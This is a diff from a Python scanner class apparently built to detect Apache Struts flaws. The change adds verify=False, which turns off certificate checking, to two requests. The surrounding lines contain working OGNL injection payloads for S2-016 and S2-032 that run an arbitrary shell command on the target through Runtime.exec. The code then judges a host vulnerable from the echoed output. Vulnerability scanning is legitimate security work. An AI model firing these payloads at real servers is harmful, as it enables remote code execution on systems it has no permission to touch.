@@ -23,7 +23,7 @@ class struts():
     def st016(self):
         payload = r"/default.action?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27" + self.linux + "%27%29.getInputStream%28%29%29%7D"
         try:
-            r = requests.get(self.url + payload, headers=get_ua(), allow_redirects=False)
+            r = requests.get(self.url + payload, headers=get_ua(), allow_redirects=False, verify=False)
             if str(self.random) in r.headers['Location'] and len(r.headers['Location']) < 15:
                 self.result.append('Apache S2-016 Vulnerability: ' + self.url)
         except:
@@ -33,7 +33,7 @@ class struts():
         payload = r"/?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd={}&pp=\\A&ppp=%20&encoding=UTF-8".format(
             self.linux)
         try:
-            r = requests.get(self.url + payload, headers=get_ua(), timeout=self.timeout)
+            r = requests.get(self.url + payload, headers=get_ua(), timeout=self.timeout, verify=False)
             if str(self.random) in r.text and len(r.text) < 11:
                 self.result.append('Apache S2-032 Vulnerability: ' + self.url)
         except:
